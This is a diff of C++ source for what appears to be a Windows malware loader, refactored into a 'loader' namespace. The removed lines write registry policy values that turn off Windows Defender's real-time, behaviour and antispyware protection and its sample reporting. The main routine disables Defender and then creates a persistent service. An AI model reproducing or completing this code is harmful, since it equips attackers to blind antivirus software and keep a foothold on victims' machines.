@@ -1,65 +1,22 @@
-#ifndef UNICODE
-#define UNICODE
-#endif 
-
-#include <Windows.h>
-#include <map>
-#include <iostream>
-#include <winreg.h>
-#include <winsvc.h>
-
-HKEY HKLM = HKEY_LOCAL_MACHINE;
-std::map<LPCWSTR, std::map<LPCWSTR, DWORD>> registryEntries = {
-	{L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
-		{L"DisableAntiSpyware", 1},
-		{L"DisableRoutinelyTakingAction", 1},
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableAntiVirus", 1},
-		{L"DisableSpecialRunningModes", 1},
-		{L"ServiceKeepAlive", 0}
-	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
-		{L"DisableAntiSpyware", 1},
-		{L"DisableRoutinelyTakingAction", 1},
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableAntiVirus", 1},
-		{L"DisableSpecialRunningModes", 1},
-		{L"ServiceKeepAlive", 0}
-	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
-		{L"SpyNetReporting", 0},
-		{L"SubmitSamplesConsent", 0},
-		{L"DisableBlockAtFirstSeen", 1}
-	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\MRT", {
-		{L"DontReportInfectionInformation", 1}
-	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
-		{L"ForceUpdateFromMU", 0}
-	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableOnAccessProtection", 1},
-		{L"DisableBehaviorMonitoring", 1},
-		{L"DisableScanOnRealtimeEnable", 1},
-	}}
-};
-LPCWSTR dllPath = L"";
-
+#include "loader.hpp"
 
 int wmain() {
-	if (DisableDefender() != 0) {
+	if (loader::DisableDefender() != 0) {
 		// disabling defender failed
 	}
 
 	// create working directory
 
-	if (CreatePersistService() != 0) {
+	if (loader::CreatePersistService() != 0) {
 		// creating persistent service failed
 	}
 
 	// start service
+
+	return 0;
 }
+
+namespace loader {
 
 int DisableDefender() {
 	std::map<LPCWSTR, std::map<LPCWSTR, DWORD>>::iterator outer;
@@ -106,8 +63,8 @@ int DisableDefender() {
 }
 
 int CreatePersistService() {
-	SC_HANDLE hSCManager;
-	SC_HANDLE hService;
+	SC_HANDLE hSCManager = NULL;
+	SC_HANDLE hService = NULL;
 	std::unique_ptr<void, decltype(&CloseHandle)> uphSCManager(static_cast<void*>(hSCManager), CloseHandle);
 	std::unique_ptr<void, decltype(&CloseHandle)> uphService(static_cast<void*>(hService), CloseHandle);
 
@@ -174,4 +131,5 @@ int CreatePersistService() {
 	// optionally set service group
 
 	return 0;
+}
 }
